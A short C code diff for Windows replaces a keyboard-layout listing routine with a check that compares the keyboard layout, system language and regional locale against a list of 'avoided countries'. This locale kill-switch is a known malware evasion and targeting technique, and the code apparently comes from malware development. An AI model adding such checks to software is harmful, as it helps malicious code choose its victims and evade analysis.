@@ -133,28 +133,16 @@ bool is_valid_hostname(const char* hostname) {
 
 
 
-void getKeyboardLanguages() {
-    int count = GetKeyboardLayoutList(0, NULL);  // Obtenir le nombre total de dispositions
-    if (count <= 0) {
-        printf("Erreur : Impossible d'obtenir la liste des claviers.\n");
-        return;
+bool is_valid_language() {
+    uint16_t id_keyboard = LOWORD(GetKeyboardLayout(0));   // Keyboard layout
+    uint16_t id_system = GetSystemDefaultLangID();         // System language
+    uint16_t id_regional = LOWORD(GetSystemDefaultLCID()); // System regional settings
+    for (size_t i = 0; i < AVOIDED_COUNTRIES_SIZE; i++) {
+        if (AVOIDED_COUNTRIES[i] == id_keyboard || AVOIDED_COUNTRIES[i] == id_system || AVOIDED_COUNTRIES[i] == id_regional) {
+            return false;
+        }
     }
-
-    HKL *layouts = (HKL *)malloc(count * sizeof(HKL));  // Allouer de la mémoire pour stocker les HKL
-    if (!layouts) {
-        printf("Erreur d'allocation mémoire.\n");
-        return;
-    }
-
-    int retrieved = GetKeyboardLayoutList(count, layouts);  // Récupérer les dispositions
-
-    printf("Dispositions de clavier actives :\n");
-    for (int i = 0; i < retrieved; i++) {
-        uint16_t langID = LOWORD(layouts[i]);  // Extraire le LANGID
-        printf("Clavier %d : 0x%04X\n", i + 1, langID);
-    }
-
-    free(layouts);  // Libérer la mémoire
+    return true;
 }
 
 
